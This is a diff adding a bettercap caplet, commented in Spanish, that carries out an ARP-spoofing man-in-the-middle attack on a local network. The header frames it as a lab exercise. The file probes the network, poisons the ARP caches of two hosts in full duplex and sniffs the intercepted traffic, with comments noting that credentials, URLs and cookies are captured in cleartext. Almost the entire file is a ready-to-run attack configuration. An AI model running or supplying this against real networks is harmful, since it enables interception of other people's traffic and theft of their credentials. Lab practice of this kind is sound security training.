@@ -1,0 +1,21 @@
+# mitm.cap — caplet de bettercap para un ataque Man-in-the-Middle por ARP spoofing
+# en una red local (laboratorio AISLADO y contra maquinas propias).
+#
+#   bettercap -iface eth0 -caplet mitm.cap
+#
+# Descubre los equipos de la red, envenena la cache ARP de la victima haciendose pasar
+# por el servidor (arp.spoof.internal = MITM entre dos hosts de la MISMA red, no solo el
+# router) y esnifa el trafico que ahora pasa por el atacante.
+
+# 1) recon: descubre quien hay en la red
+net.probe on
+
+# 2) MITM entre dos equipos de la propia LAN (no hacia la puerta de enlace)
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.13.37.20, 10.13.37.30
+arp.spoof on
+
+# 3) esnifa el trafico interceptado (credenciales, URLs, cookies en claro)
+set net.sniff.verbose true
+net.sniff on
